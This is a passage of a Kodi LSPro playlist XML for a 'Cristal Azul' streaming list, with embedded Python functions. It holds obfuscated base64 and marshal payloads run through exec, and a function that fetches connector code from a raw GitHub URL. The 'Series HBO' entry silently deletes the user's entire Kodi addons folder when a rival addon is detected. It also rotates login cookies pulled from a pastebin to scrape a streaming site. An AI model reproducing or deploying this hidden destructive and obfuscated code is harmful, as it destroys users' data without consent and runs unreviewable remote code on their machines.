ZCYlhCdFFYZEZkMXB0ZERKQlIwdzBRVlJNTWt4dGNEVkJWRXh0UVcxeGRVRnRkRzFhYlZvd1FYcEVNMEpSUlhsQk1sSXpXbEZGZGtGM1dqQk1SMFY0V25wV2JVRjNSRFJhYlhRd1FrZEZkVUZIY0RKYVIwVjRRWHBJTWsxSFJYVkJWRWd4UVhkYU5VRkhSREpNUjFkNlFWUk1iVUZSUlhsQmJYQXlRVWRFTWxwdFRteE1kMW93UVcxME1reHRUR3RCZDBReVdtMWFNRUY2U0d4TWQweHNXbTFTTWt4dFdqRkJVWFF4UVZGYU1FRlJkREpCUjBocVFWUlNiVnBIU0RWQlIzUXdXbTFOZDBGSFVqTmFVVTE1UVZGNGJWcEhjRFJCVkVneldrZEZka0Y2U0RCQ1IwUXpRWGRhTWt4dFJHeGFiVVF6V20xd05VRnRXakpNZDFveVFXMUVNVUZSUkRSQmQxWXlUSGR3TWtGNlNEQk1SMFF5UVhkRWJVRnRXbXBCVkZvelFVZEZkVUYzZURKQmQxZDZRVkZ3TUVGUlNERmFiVVF3UWtkYU0wRlVSREZDVVV3elFVZE9NVUZIVERWQlVVUnRRVkZJTTBGUlZqTmFkMGcxUVVkME1reDNSRzFCZWt4dFduZElOVUY2U0RCYWJVVjNRWHBXYlZwM1RHeEJVVlp0V20xTmVrRlVSREpNYlVsMVFVZE9iRXgzUkRWQlNsSnRXbTFhTkVGVVNERk1SMDE0UVcxT00wSkhTWFZCZDFvd1RFZElORUZSV2pCYWJVeHRRWHBJYlVGSFdtMUJWRXh0V20xYWEwRjNlREphUjFvMVdtMTBNRUpIVERWQmQwUnRRVWROZVVGSFJESkJiWEF4UVhkYU0xcDNSRFZhYlVRelFrZHdNMEZ0U0RKTlIwbDFXbnBXTUUxSFdqVkJkMW95VFVkRU5WcHRSRE5hUjFwdFFYZE1Na3gzU0dwQmJVUXlUSGRNYkVGSGVEQk5kMW8wUVZGV2JVRkhXbTFCZWxvelFrZE1ORUZSVEcxYVIwMTFRVlJhTWt4dFdtMUJla2d3UVVkYWJFRjNSRzFCVVV3eVFWUk1NbHAzUkcxQmJYQXhRa2RNYkVGNlZqTmFkMHcxUVZSYU1rSlJSRFZCYlVneVFVZElNVUZIVm0xYWJVUTBXbnBNYlZwdFNHeEJSMDV0UVVkd01rRkhXak5CZDFvelFWRldNMEpIUkRSQlIzUnRRVzFNTVVGVVVqQk1kMHd4UVZSV01VeEhSRFZCZDBneVFrZEVORUZIV2pCTWQxcHJRVkZhTWtGUldqSkJiVm95VEVkd2FrRlJXakZhYlV3eVFVZHdNbHB0U0RCYWVrd3pXbTFNTTBGSFJETk1SMHcwV25wTU1FMVJWM1phZWxZd1dtMU1Na0YzUkROYVVYRjFXbTEwTWtGdFJYbGFiVWd6UVZGRmQwRkhSRE5CYlVRd1FWUkVNbHB0U0RKQmJWSXlRVzFOZVVGdGVEQkJSMXBzUVZSTU1FRjNTRFJCU2xJeFdrZE5lVnB0U0RKQ1IwaHFRVkYwTUZwdGNHeEJla2h0V2tkYU1rRkhkREJDVVZwcVFYcElNazFIVFhaQlZFUXdRVkZFTkVGSFRqQmFkMW8wUVhkRU1rRlJjRFZCVVhBeFFXMUVNa0YzVERCQlVWb3lRVWRhTUZwdFYzWkJSMHhzVEhkTWEwRkhlREpCUjBoclFVZE9NRUZ0Y0RGQlIwd3pRVWR3TlVGUmNHMUJSMGd3UVZGME1FeDNSRzFCZWtneVFYZEliRUZVVmpKYVIwVjVRWGRhTVZwM1YzWkJla2d5UVVkTU1FRjZTRE5CZDFwcVFVZDBNMXAzUkRGQmVsWXpRVWRFTUZwdFdqTmFVWEF5UVcxNE1FMUhSREpCVVZveVRFZGFNMEZSVWpKQmQzQXhRVWRNTUUxSFdtMUJSMDV0V2tkTmVrRkhUR3hOZDFvd1FVcFNiVUpSY0d0QlIweHRXbEZ3TUVGNlRHeE5kMGwxUVZSTU1reEhjR3RCYlhCdFduZFhla0ZIVGpKTWQzQXdRVWRhTUVKSFdqRkJiVkpzVFhkTU1rRkhSRE5DVVV3eVFYZFdNVUZIV2pGYWJWb3dUWGRGZFVGUlRETmFVVVYzUVcxd01WcFJXakJhYlhneVRHMUZlRUY2U0ROQmRuQkJVSHBuZVhKS01YVnVNa2xzVmxFd2RGY3dVM2hCZVVGb2NtRlRVa3h0VEdsQ1NtTklTVWROYUZwTFFYbHlVMFUwUlRCNWJXNHlWbTF4U0hsalRURjVia3AzVFc1YWQwRXhRWGQ1TUc5R09VMUZVWGsyUVVveFowZEtVMk5hTUhsS1RFbHhhbkJLT1dodWJVbGhTVzFCZWt4S2EyUlpNRk5sUmtwQmJFUktkVmRGU0RWUlJVZFBZbGt5ZURWeFlXTnJXakJuTW5CM1FVbE5SMWQ0Ym0xVFlWcFFPV054UjNGQlRIaEJNWEI0WnpWR2JVVmpSa2RJWlVwSVoxTnhTR294VFVoVGQyNHpUbXBKWVZkV1dtdzVXRWRzWjFSeGQxZGhibEpJYlUxdFVteE1TblF5V1cxMWJtOVVPV2xFU21ZelFXRlhaRmh0Y1RCTlVYRlpRVXAxTTBwNmNUTk5WR0psUkcxNWFVMUlabTFDVlZKc2NFZDVZa3d6UVdoQlVuaHJjSGRYTUUxS2VWaEZWRFF3V214bldrMVZTVEJLZUUwemJrdGlhVWxVVFdOd2VrVkRjREl3YVhCTGNVMUJVM1JxYmtvNWVFMUhUakpKU1UxRFRHMVhWMHg2TVRCSVZYUXhSa2xYWm05VlZqSnZValJwV20xQmVVbEtSV0ZhYlhodFNFZEplbkIzZVZaR01tZHFUVWhGWmsweVFWcE1TRUZQVEdGT05HOUhVMUZ3TWpFeGJuZHhaVWd6UVdKSmVHc3pSakJxTTBFeFdqVndTa2d4Y2xSd01FRklWek5FU0ZKcldXMTROVzVWU0d4RlVVRm5UREpXTlZwS1JHdEtVakZIUVRCbk5FWkpUMHhOU2sxbWIwcEZhMFZLVXpOdmJWWnNSMUZKYkc4eFNWQkZNMW8wVFVsVFJrcFJlR1ZIUjNsb1NWRlhWRzVUWTJOSmVraGxUVE5GU1ZveVNUTkJlR016VFVkRmEzSlVNR3RFTUdZMVRIaEJTMHhLZVZweFNreHJXVE5YYVZneGRVeHVNbkExY0ZWMVdHOVRZMHBFU1hodFREQkZZMHAzZVcxeE1HTnBSMGw0Tlc1TFJUWkZNMWRvU0hoWE1FMHdXbXRJUjBWTFJqQm5aVTB5Y1hsRk1HdENSMU5qWTFveGRXMWFTbXQ2Y25weFJuQnRUVFZCZWpoclFrbFhhMFJLY1ZKTk1GcHNUREJ4VlVFelUxQnZlblV5VFVsSlJrMVNPVk51TUhsNFFVcG5iSEZIUVdWTWVGSmxRVWxGTTBoVmVXaHlZVUZYYm5neE1rSlVWMHRHTTNGU1RFZFRiRzkzU0RGdWVqRmpXak5hYWtWM2VVOUhTMGwzUlV0WFdVWjNUVVZFUzNsWVFYbzRNMGRJT1ZaTk0zQXhUWHBKV1VWS2RHeEpiVkpwYmxKbk5rMXRXbXBGZG1kWFJVcDVaMjU0T0RKSlZHTlFXVzFTTUVkVU9UTnVTRWxxUkV0U2FrSlVTWGx5ZDBReVJIbDFZbGd4UVVGQmJWSXhja3BGUlVGSGNHeEhVVk0yUVd3NE1VeEtVak5hVVhWNWIwbFNhbHBVTldSdWVGTlFiMGRPYlV4TGNHdEJlRTFuU0ROQlNHNXRlV2RHU0dkNVJrdGpRMGN5T0RCYVMyTlBibE54ZVZvemVVVk5kM2hzUjB0UFVFeElZMkZaTWtsWFJETmpla1I0Y1dKTlNFeHFiek41VFVkU09WbFpNazFoUkVoTlpFRjNRV1JDU0d0UGJtdzVSVTFSY1hkS1ZVMHpUVEJ4WmtkS1JYaEJiWEZzYjNveGJVUkljWGRIVUdjMVFXeG5ZbG95VFVsSE1WTmpRVEJYVVVGS1owRklTVWxsUm5wMU5rZGhVbVZJVkdkTlRWSXhObGt6ZVdGdWJYQXlXbFJNTWt4NFNUUkJNM2d6Y0VabWJGcElNRE51YlVGdGNIaG1iVWh0VFc1Q1NHTkhjREk1YVVZd1owcEdWWEZwU1ZSamRYRlZRVEZ5U0dONVRUQjVlSEV3WTFsYU1rZ3hjbUZPYlVKSWVHVnZNRVJ0U1ZSalQwUnRWbVZhTUZac1RUSkJOa0pMUlROQ1VuRnVSM293YkZvd2NVSndNM0JzYm14bldFZFZUMUZHTUdNd1RYZFhiSEJWVFU5SFZWZHNTbUZOWm5CVldqUkhTRk4zYmxKcU0xcHRRV1p1ZDNsWWIzZFhWRUV5TkRGRWVFeHRXbmd4VFhGSFNXdE5iVWcwVFVwV2JWb3dWekJDU1ZKcVRWVjVhRmt5UVdsRWVYbFBXREJ3TW01UlUyeEdZVmRwVFZSWE1ISlZSRFZ3VWxZd1JrZHdNRWw0YTJsd2VWZHNibUZqYmtWVGVVVktTbGR1U1VoaU1uQktSREZCZWpRd1NFcDRNVzl0Y1ZsSE0weHRibUZhTVhKNlYyUkhNazFaY0VneFJFMVZTREZOWVVGSlRHMTRNVWhVYTB4Q1NHWnRibnB4VDBsUU9XeE5VVk5CU1VveE5uQXdSV0ZhTWsxMWJ6Tk9hWEIyWjBsTlUxZG5Sa2xqZVVwVGVWbHlSbWMyUkcxWFdVaExZbXRKUm1kdFJqQXdNa1IzU0dWdVZIa3hTbm94YWtaNmRWTndTamxsY0ZSSWEwcFJVMnh2U25sNGJrZzFObTk1WTBweWVsZHNjV3huTVVoNVJHMWFNSEZaUm5ZNVpVeDJabXRCUjNCcmJrcHhNMHA2WjFOeE1rd3pibFZhTTBReFJXWkhNbmd5UWxONWEzQklRVFpFU25WNGJ6STBhazB5VTJ0eFIwbG1jRWRQYW5BemVHMXdVWFF5U1VsTlVVUkhkREpOTWtVMVJrZEpRbkF5VTNoR1ZGTlhSRWh3TlVGUlYyRkpZVnBxYmt0V01FUXlPV2RGTWtsa1NrWTVWa1F5VEd4TmVGTlBRWHAwTkVoNWVETnZiWEZhUm5kNE1FSlVUV1JFZWxOcVRUTkJiSEJMVjFoTlVWTlZTVEJGZWtkU1V6TnhWRGx1Y0hwWGRVaElORFJ3U0dvd1NWVldiVzU1WTNoWk1IRmhURWR4V0VadGNWVkpVVm96V0cxSmFXNUtlVFJ5ZVhGb2Nrb3hSRXBVUVVaWk1rMUVibEJuYlVSS1YxVkNWSFJwY0hkVFRXOHljWGx2WVU0MVJsQm1NWEpLU0ROYVNsTmFTRWR4UlVSdFQybE5Na0UyUkVkeGFGcDRlWGh3ZUdkWGIzcGFhWEZHT0RSSlVrVnNTa281TTNCM1RWWnVWVmQ2UmpJeFluQlVTWHB5VW5GbFNWSklNbTk2YW0xSk1HZG5TVlJNYVVwS1oyTnlVVUZxYjNkd01VUXdPVmRIU21jMGNsUk5iSEJTVjFGYWQwMURRbEZ4WjI5VWNHdEJkM0J0Y2tZNWFXOVRUbWxOZDNsc1IxTmpNMjlLTURKTVNsb3djVlF4TTBGaFdqVkdVVkpyV25ablZtOUpRV3hGWVdJMGJsRlRaMGQzZUdsS1ZVUXlTVEJxTTB3eGNUTmFVbEpzYjBoaloweDJPV1JOVlZkTVJURlhla1YzV21weGJWY3lTVEZGWjB3d1ltVk5TREZZVEcxVFlVSkpWMk55ZDA5RVRVaDVRMFZMUVhWd1ZGZDNSa3RqWWsxSlRqQkhTbU14Y2t0SU5VWXdTR3hGZG1ZMFRIcEphMDE2ZUd0YU1FVmlRbEo1TlhKaGNUSnlkMEZyU2tZNWJuQkpSR3RKTUZvMFNsTjBiRTEzZEdwSVZHZFlSekl4VTBSS05XbE5NR0l4UWxSSmRYQlJSVzVOVlZvemIwZFRla2hUUldwSFNHTjVRbFZCYkhCNVNXeGFNR2Q1U0VwMVowRjZlVWxGU0dORVRUQnhOVWxLVjBWdVZGWTFibFI1YlZodFYzWkpNV05WVFROME5FcExlRE5JUjNWdFJtRlBSVnBSY0d4Wk1sTXpSV0Y1ZVVnelltdEllVVF6YjB0RlpWa3dNR3RHTURScFRYcEpiVnBMVTFsYWVqbEpja2RNYTI5Nk9XVk5lR295Uld4blpscExSVmh1ZUVsNVNWTldaVUZoV210YWVHdFViMUJuYkZwSGRVZHhlR2RUVFcxQlZtOUxUVXB1YlhsUFFrcDFWa0ZLVFdKQk1uRnRiM2RNYVVSSllqSktkM2xoY0VwRlVrWjVlWFpJUmpsTGJsVlRlVVpTVjJWdmQwOXRXVEJYV25FeU5VdEtWSGd5VEhveGVYSlZlRFZIZVVGTGNXMVBZa0V5Ukd0R01FRk1USHBGYm5CdFQzWkZlR3RNY0V0U2FVVXdjV1ZKU1ZkUVdHMUphbTh3TVc1WU1XSnBSakZYUVVSSlQybHhkM2xqU0hoalJVRlZVMnBLUjBGRFRIbDVWbHBMZFd0eVlVOVhTVE5hYW05U2NWcE1NMDlVYm0xeFprSklOVXBDVkRsb1dUQTVZa2xHWjJSdVNGcHRSek5OTUc4eWNHdE5NblZaUmtvMFpVZEthalJGTVhWcGNsSlRaazFTUlZGQ1IzRjVjbFE1YmtKSVUyRnZTMVkwY0ZSbWFVWjNUalJ2U1hWclJ6SnJkMFJMZFdKdmJVMHlUREppYW5BeVkwZEZlbE5MU1VnNWVYQklZM1pKUzFkaGNFdE9hMXBIU1ZWdlZEbGtUVEk1WmtSTGVUWkdTa2xtUlcxV00weEtRVUZFUjNWRlNVbDROVWd5YTJkSVIxTnBRa1k1WTB4SVUyWktVR2ROY2tkUFpsb3lNV0Z5UjFOYVJWVlRVMFF5VTNwRU0wbGlTWGRYUzI1VU9VOXVTMVkxU0ZGNFpVUktUVVZ3U2sweFNuWm1NMGwyT1ZGdVVYRjVSVWg1VTBoNWVXZEtkMU5SVFZCbmFuRnRUR2xKU0VsSlJETjRORzlKWTBGQ1IzRm9jRlIxWTBaSWF6RkJlblZIY1ZWT2JWa3daMEZHUjBsaFNuZ3hZa2xJZVZsR01rUXdXbTFFTTNCdFNYcGFNalZSV2pOSU5FWnRSV1phZDFkc2NuaG1iRzV0Y1dkTlZEQXpibXc1ZGtKS05XRnhTakV6U0VoblltNHlTRFJLUzNRd1RWUTFkbTR4WWpSRU1tZFhRVWhuYUUweVJUWk5VbU40YmpJMWJFSlZjV2xNUjNnMFRWVldNMXBSZVhaQmQzRlVUWHAxWTAxS1oydHZNamd6UVV0ak1XNUhjV2x4TUVFMlRWUjVSRmt6VmpGYVlYZ3pTRXRUV1VSM1R6QllNRTFzUlVwcmVHNHlTREp3VTJOUWNFZEJSRVl5VERWS1NYaHRURWhUV1hBelNWVkJNVWhsYmxWVE0xcDZZbXh2YkRsWldsTmFhbkJIZVZGRVNVVlZXbmxQTTFwSGNWRk1TMEZyUkVveGFFaEhRVlZ3U1VWVFJqTkJRWEJJZUdWRk1IVnVRa2xJTWtGSU5HcEJNbGRTUVVvMU1XOHplWGRCZWpGVmJtRnhSVzR3Y0ROeGJVUnNjVWd3TW01NVFVcEdNbmxYUmtoV2JHOVZRV051YlZZMVNGSlNhVnA0ZFZKRWVqVTFSakp4UmtSS1UwZEhkamxuVFVkeFZFeElUVkZ1U2pneVJ6STVXVzk2ZVhWeWVGcHJTa3R4YkV4aFZqRkpNWGw0Y1hkSlJreEtNVkZLVVhsQlNtRk5USEpVTVdWQllYUnJjRlJ4YlhFeVoyUklNM0V6U1VveFFrUjNlRzFIWVZOa2IyMUlNMHhKWTFCSVVYaHBTRXROWVZnd1ptbHhSamxSUWtkRlVVcDZhMnhZTTNGbldETlBaMFF5UVcxdVIxTkJXako1YTFsdGRWcE5SamxFUWt0amJFUnRjV3RIUzNsa2JraEJUMFV4Y1RWeWVuaHNia2R4YVZodFNXWnVTa1ZZUlZGMVkyNVZRV3RCU25sRVFsRlhNVzlWUVZaTmJYVktjVkE1UzBodGVXRkdTREZ0UWxSbk1YQlRXalZHZDBocFFsVkpka0ZLVXpOd2VIQXpTVEpCVVZwaFRqUmFiWFZxV1RJeFZVRXdSV1pZTUhGMWNsTjVURzk1ZFRKd00xWnNiMGRGWTNGaGRXWnhNVWxuV1RKRmJFVnRXalJFWVVGbmIzaHdNSEpKWTJOdmJEa3dRVlF3YVVRelkyMXZWR1l6UVhsaldVUnRlVE5JU2xNMVdEQjVWVmx0UVZGd1lYZzFXREI1VVVsU1NXTkZVa3hwY25oV05FSlNlVkJ5ZDNGalFYcDViRXd3Y0RGSk1qRmhSRWRFYkVaNFdqUlpiVlpyV1cxQk1sZ3lPWFp3UjFkVlNHMU5iVWxIZVdKd01Hb3hSWGQxVWxwS2RVWllNM1JsUjBwblQwZExUR3hhYkRsWlFYZHdaVVJzT0ROS1MzaHBUSFk1WTBsNmNVOXlVVlpwUjJGTmJuRlVZbWxDUjBGRmNrWm5SVzlIU1cxQ1NFVXpSbFJ4VlhKVmRHbHdNblZCYmxWSk5VbEllV1pKVVVocldqSm5XSEZWVTFGdk1tdDVXa2RKVlhBd2RUQkpZVTF1V0cxWGJFRlNTVEZhTUVSc1JuZDBORVpIVDJkRU1sTlFTVWRKZFZwM1QyUllNR3RKVFhod2JWcFJWMlZ3TUZkNGNHMTRhMFl6ZUd4TlVVMVdRa3RhTkVGR09ERnZlVWwyUjNwQlVsb3pjVWRLZGpsaWJrdGFORVozU1dwdlNqRnRiM3BhTUVGR09EVnZiRGsxV1RGRWJWa3lkVVpHU2xJelJIWTROVzk2TlZCd01tdGFjSGRTTkhCVU9YVnhSMFJwU0VkNWFsa3dhMnB4TVZNelFYZDFNVWxTUVhkd01VVmpRV3huTVV4SGVXZFpNV0pyV1cxSllVSkhUVkpaTW5nMWIwZHdhVUpIU1dkWU1VVTJRa2hCWkhGSGVUUmFWWEZQUWt0NGJFUXhRVzF3YkRsalRFbGphbTkzUVZSRlUzVlRSMHBYUjFreVptVnlTSEZ0VFhoWGRVWlNaMEpIUmpsSldtMUZiRzVIUkRKeE1IRkdSblk0TTAxSFR6VkJTRVZSV0RKeGFrVjRPV2h3YkRocGIxTjVhMjUzZFdOR01rRXhjRXRCUkUweFNHbEJlSEZyY1ROMVlrRnNPVXR1VW1OamJrZEZNRWg2WjJoYVNrVm5UVE5CTTB4SFRXbFpiVmRqUjBZNVkwVXlNVzV3TTBsblFVaG1OVzlHWmpKdllWSTBiakpxTkVkSVozVlpiRGcwUVVZNGFVSlVlV05aYkRremJrcDVVa0ZHT0dWdlJtWTFXV3huYlZvd2EwbHVlbmcwUWtwd1pVeDZSWFpGWVVSaFVVUmpObTVLT1doV1VUQjBWekZyTkVGdFYzQnlVVTE2UzFWME0wRlRhelJhYlZOd2NsRmFiVmRxTUZodmVrbHBWbEV3ZEUxTFRYVnZVSFJoUzFWME1scDVhelJCZDNsd2NsRk5lVXRWZERKYVNXczBRVzFCY0hKUlRHMUxWWFF5UWtsck5FRjNlWEJ5VVZkNVMxVjBNMEZKYXpSQmVrbHdjbEZNTkV0VmRESkJTV3MwUVcxMWNISlJUWGRMVlhReVFrbHJORUYzVFhCeVVYQTFTMVYwYkVKVGF6UkJla1Z3Y2xGTmVrdFZkRE5hZVdzMFFXMVBjSEpSVERSTFZYUXlRVWxyTkVGdFNYQnlVWEJ0UzFWMGJFSkphelJhZDA1aFdFWk9aVlpVU1RKTVNtcGlWekZyTkVGM1FYQnlVVTE2UzFWME1rRlRhelJCZDBsd2NsRk1iVXRWZEROYU1XczBXbnBKY0hKUlREQkxWWFF5UVVsck5FRjNRWEJ5VVUxNlMxVjBNa0ZUYXpSQmQwbHdjbEZXTkV0VmRETkJVMnMwUVcxWGNISlJURFZMVlhReVRVbHJORUYzZVhCeVVYQXdTMVYwTTBKSmF6UmFla0Z3Y2xGV2FrdFZkRE5NU1dzMFFYZDVjSEpSVFhwTFZYUXlUVWxyTkZwM2VHRllSazVsVmxSSk1reEthbUpYTVdzMFFYZFhjSEpSVERWTFZYUXlUVWxyTkVGM1UzQnlVWEJ0UzFWME1sb3hhelJCZDNsd2NsRk1OVXRWZEd4TlNXczBRVzFKY0hKUlRYbExWWFF5UWxOck5FRjNTWEJ5VVhBMFMxVjBNa3d4YXpSQmQzbHdjbEZNTWt0VmRETkNTV3MwV25kMWNISlJUWHBMVlhReldubHJORUYzVTNCeVVVeHRTMVYwTWt3eGF6UkJkMGx3Y2xGV05WZHNlSFJZYkU5NWNYcFRabGhRY1hCeVVVeHRTMVYwTWsxNWF6UkJkMFZ3Y2xGTU1VdFZkREphTVdzMFFXMUJjSEpSVjNsTFZYUXlRVk5yTkVGM1NYQnlVVXh0UzFWME1rMTVhelJCZDBWd2NsRk1NVXRWZEd4Q1UyczBRWHBYY0hKUlRERkxWWFF6UWtsck5FRjZSWEJ5VVV4clMxVjBNa3g1YXpSQmQwbHdjbEZ3YkV0VmRHeGFVMnMwV25wQmNISlJWbXBMVlhRelRFbHJORUYzZVhCeVVVMTZTMVYwTWsxSmF6UmFkM2hoV0VRd1dFMUxUWFZ2VUhWM2J6SXhhbTVLYTNsWVZXTm1ia3BXYUUxVVNYZHZNakZxY0hwSmJYQnNkWFpNUzBGNVFYZEVhRXgzVERCTlZFbDNiekpGZVZoVVNUSk1TbXBpVnpGck5FRjZTWEJ5VVV3eFMxVjBNazEyY0dOWVJuaG1WMjFyYlhGVlYyTnZlbkFyVjJ4cVlVMUxkWGxNYkhCaldFUTlQWFFGQUFBQWNtOTBNVE56Q1FBQUFHMXZjbkJvWlhWeklITWNBQUFBWTI5a1pXTnpMbVJsWTI5a1pTaDBjbWx1YVhSNUxDQjZhVzl1S1hRR0FBQUFiM0poWTJ4bGN4NEFBQUJqYjJSbFkzTXVaR1ZqYjJSbEtHdGxlVzFoYTJWeUlDd2dlbWx2YmlsMEF3QUFBRzVsYjNNSUFBQUFQSE4wY21sdVp6NTBCQUFBQUdWNFpXTW9Dd0FBQUhRR0FBQUFZbUZ6WlRZMGRBWUFBQUJqYjJSbFkzTjBDQUFBQUcxdmNuQm9aWFZ6ZEFjQUFBQjBjbWx1YVhSNVVnUUFBQUIwQ0FBQUFHdGxlVzFoYTJWeWRBUUFBQUI2YVc5dWRBUUFBQUJsZG1Gc1VnVUFBQUIwQndBQUFHTnZiWEJwYkdWMENRQUFBR0kyTkdSbFkyOWtaU2dBQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQWdBQUFBOGJXOWtkV3hsUGdFQUFBQnpEZ0FBQUJnQkJnRUdBUVlCQmdFR0FTb0IiKSkp"))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/GlB2z5m.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>

--------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightseagreen]Series [/COLOR][COLOR white]HBO[/COLOR] </title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
def GetLSProData(page_data, Cookie_Jar, m):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = xbmc.translatePath('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = '(?s)"item movies">.*?href="(.*?)".*?src="(.*?)".*?alt="(.*?)".*?p>(.*?)<.*?span>.(.*?)<'
    cookie_distancia = urllib2.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        response = requests.get('https://playdede.com/lista/2388/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
        data = re.findall(patron, response)
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.get('https://playdede.com/lista/1244/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
            data = re.findall(patron, response)
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            return [(' ', 'https://i.imgur.com/r6aXooD.jpg', ' ', '[COLOR white]Web en Mantenimiento', ' ')]
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        url = item[0]
        imagen = item[1]
